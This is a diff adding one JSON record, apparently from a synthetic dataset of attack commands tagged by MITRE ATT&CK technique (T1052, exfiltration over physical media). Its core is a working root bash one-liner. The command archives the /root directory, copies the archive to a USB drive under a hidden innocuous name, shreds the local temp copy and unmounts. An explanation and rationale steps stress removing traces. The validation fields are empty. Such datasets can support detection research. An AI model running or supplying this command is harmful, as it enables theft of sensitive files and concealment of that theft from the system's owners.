@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'UPART=$(ls -1 /dev/disk/by-id/usb-*-part1 2>/dev/null | head -n1); mkdir -p /mnt/usb && mount \"$UPART\" /mnt/usb && tar -cf - /root 2>/dev/null | gzip -9 > /tmp/.r.gz && cp /tmp/.r.gz /mnt/usb/.thumb && shred -u /tmp/.r.gz && sync && umount /mnt/usb'",
+  "explanation": "Compresses sensitive /root contents with gzip into a temp file, copies it to a USB under an innocuous name, securely deletes the temp, and unmounts, keeping activity local.",
+  "rationale_steps": [
+    "Mount the USB via a stable by-id path.",
+    "Create a gzip-compressed tar of local root data.",
+    "Copy the archive onto the USB using cp.",
+    "Securely remove traces from the host and unmount.",
+    "Operate entirely on local, removable media."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-9e74f95a",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
